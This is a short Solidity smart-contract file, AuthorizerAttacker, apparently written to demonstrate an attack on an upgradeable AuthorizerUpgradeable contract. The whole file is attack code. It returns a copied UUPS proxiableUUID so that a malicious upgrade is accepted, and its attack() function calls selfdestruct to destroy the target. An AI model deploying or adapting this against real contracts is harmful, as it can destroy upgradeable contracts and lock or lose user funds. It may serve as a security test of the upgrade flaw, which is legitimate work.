// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

/**
 * @title AuthorizerAttacker
 * @author MJ
 * @dev A contract used to BLOW UP the AuthorizerUpgradeable contract through a selfdestruct.
 */
contract AuthorizerAttacker {
    function attack() external {
        selfdestruct(payable(address(0)));
    }

    /**
     * This just exists to make the contract seem proxiable during the malicious contract upgrade.
     * UUID copied directly from UUPSUpgradeable.sol.
     */
    function proxiableUUID() external view returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}
